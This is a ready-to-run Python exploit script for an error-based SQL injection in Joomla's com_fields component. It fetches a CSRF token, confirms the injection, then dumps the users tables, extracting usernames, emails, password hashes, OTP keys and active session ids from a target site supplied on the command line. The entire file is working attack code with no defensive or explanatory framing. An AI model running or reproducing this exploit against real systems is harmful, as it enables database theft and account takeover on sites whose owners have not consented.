#!/usr/bin/python
from __future__ import print_function
import requests
import sys
import re
import argparse
import random
import binascii


def print_info(level, info):
    """Print data with varying colors based on provided level"""
    END = '\033[0m'
    ERROR = '\033[91m'
    SUCCESS = '\033[92m'
    WARNING = '\033[93m'

    if level == "WARNING":
        print(WARNING + 'WARNING: ' + info + END)
    elif level == "ERROR":
        print(ERROR + 'ERROR: ' + info + END)
    elif level == "SUCCESS":
        print(SUCCESS + info + END)
    else:
        print(info)


def extract_token(resp):
    """Extract the sql token from the response"""
    match = re.search(r'name="([a-f0-9]{32})" value="1"', resp.text, re.S)
    if match is None:
        print_info("ERROR", "Cannot find CSRF token")
        sys.exit(3)
    return match.group(1)


def parse_options():
    """Parse the command line arguments provided"""
    parser = argparse.ArgumentParser(description='Jooma Exploit')
    parser.add_argument('url', help='Base URL for Joomla site: "http://<ip>/dir" or "http://<url>/dir"')
    return parser.parse_args()


def format_url(url):
    """Append the http protocol to the url if not already included"""
    if url[:7] != "http://" and url[:8] != "https://":
        print_info("WARNING", "URL protocol not provided. Assuming http.")
        url = "http://" + url
    return url


def build_sqli(colname, morequery):
    """Build a SQLi query"""
    return "(SELECT " + colname + " " + morequery + ")"


def sqli_extract(options, sess, token, colname, morequery):
    """Extract response from SQLi"""
    sqli = build_sqli("LENGTH(" + colname + ")", morequery)
    length = sqli_connect(options, sess, token, sqli)
    if not length:
        return None

    length = int(length)
    offset = 0
    result = ""
    while length > offset:
        sqli = build_sqli("HEX(MID(%s,%d,%d))" % (colname, offset + 1, 16), morequery)
        value = sqli_connect(options, sess, token, sqli)
        if not value:
            print_info("ERROR", "Failed to retrieve string for query: " + str(sqli))
            return None
        value = binascii.unhexlify(value).decode("utf-8")
        result += value
        offset += len(value)
    return result


def sqli_connect(options, sess, token, sqli):
    """Connec to the joomla database"""
    sqli_full = "UpdateXML(2, concat(0x3a," + sqli + ", 0x3a), 1)"
    data = {
        'option': 'com_fields',
        'view': 'fields',
        'layout': 'modal',
        'list[fullordering]': sqli_full,
        token: '1',
    }
    resp = sess.get(options.url + "/index.php?option=com_fields&view=fields&layout=modal", params=data, allow_redirects=False)
    match = re.search(r'XPATH syntax error:\s*&#039;([^$\n]+)\s*&#039;\s*</bl', resp.text, re.S)
    if match:
        match = match.group(1).strip()
        if match[0] != ':' and match[-1] != ':':
            return None
        return match[1:-1]


def extract_tables(options, sess, token):
    """Extract table data from joomla"""
    tables = list()
    first = False
    offset = 0
    while True:
        result = sqli_extract(
            options,
            sess,
            token,
            "TABLE_NAME", "FROM information_schema.tables WHERE TABLE_NAME LIKE 0x257573657273 LIMIT " + str(offset) + ",1"
        )
        if result is None:
            if first:
                print_info("ERROR", "Failed to retrieve first table name!")
                return False
            break
        tables.append(result)
        print_info("SUCCESS", "Found table: " + str(result))
        first = False
        offset += 1
    return tables


def extract_users(options, sess, token, table_name):
    """Extract users from table"""
    users = list()
    offset = 0
    first = False
    print_info("NORMAL", "Extracting users from " + str(table_name))
    while True:
        result = sqli_extract(
            options,
            sess,
            token,
            "CONCAT(id,0x7c,name,0x7c,username,0x7c,email,0x7c,password,0x7c,otpKey,0x7c,otep)",
            "FROM %s ORDER BY registerDate ASC LIMIT %d,1" % (table_name, offset)
        )
        if result is None:
            if first:
                print_info("ERROR", "Failed to retrieve user from table!")
                return False
            break
        result = result.split('|')
        print_info("SUCCESS", "Found user " + str(result))
        first = False
        offset += 1
        users.append(result)
    return users


def extract_sessions(options, sess, token, table_name):
    """Extract session from table"""
    sessions = list()
    offset = 0
    first = False
    print_info("NORMAL", "Extracting sessions from " + str(table_name))
    while True:
        result = sqli_extract(
            options,
            sess,
            token,
            "CONCAT(userid,0x7c,session_id,0x7c,username)",
            "FROM %s WHERE guest = 0 LIMIT %d,1" % (table_name, offset)
        )
        if result is None:
            if first:
                print_info("ERROR", "Failed to retrieve session from table!")
                return False
            break
        result = result.split('|')
        print_info("SUCCESS", "Found session " + str(result))
        first = False
        offset += 1
        sessions.append(result)
    return sessions


def pwn_joomla(options):
    """Extract tables, users and session data from joomla"""
    sess = requests.Session()

    print_info("NORMAL", "Fetching CSRF token")
    resp = sess.get(options.url + "/index.php/component/users/?view=login")
    token = extract_token(resp)
    if not token:
        return False

    # Verify that we can perform SQLi
    print_info("NORMAL", "Testing SQLi")
    result = sqli_connect(options, sess, token, "128+127")
    if result != "255":
        print_info("ERROR", "Could not find SQLi output!")
        return False

    tables = extract_tables(options, sess, token)

    for table_name in tables:
        table_prefix = table_name[:-5]
        extract_users(options, sess, token, table_name)
        extract_sessions(options, sess, token, table_prefix + 'session')

    return True


def print_logo():
    """Print logo and credits"""
    clear = "\x1b[0m"
    colors = [31, 32, 33, 34, 35, 36]

    logo = """
    .---.    .-'''-.        .-'''-.
    |   |   '   _    \     '   _    \                            .---.
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \.
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |
 __.'   '                                               |/\'..' / '---'/ /   | |_| |     | |
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.
|____.'                                                                `--'  `" '---'   '---'
         Original code by @stefanlucas

"""
    for line in logo.split("\n"):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))


def main(base_url):
    """Start here"""
    try:
        options = parse_options()
        print_logo()
        options.url = format_url(options.url.rstrip('/'))
        pwn_joomla(options)
    except KeyboardInterrupt:
        print()
        print_info("WARNING", "Interrupted by user. Exiting gracefully.")
        sys.exit(0)
    except requests.exceptions.MissingSchema:
        print_info("ERROR", "Invalid URL format")
        sys.exit(1)
    except requests.exceptions.ConnectionError:
        print_info("ERROR", "Joomla instance unreachable")
        sys.exit(2)


if __name__ == "__main__":
    sys.exit(main("http://192.168.10.100:8080/joomla"))
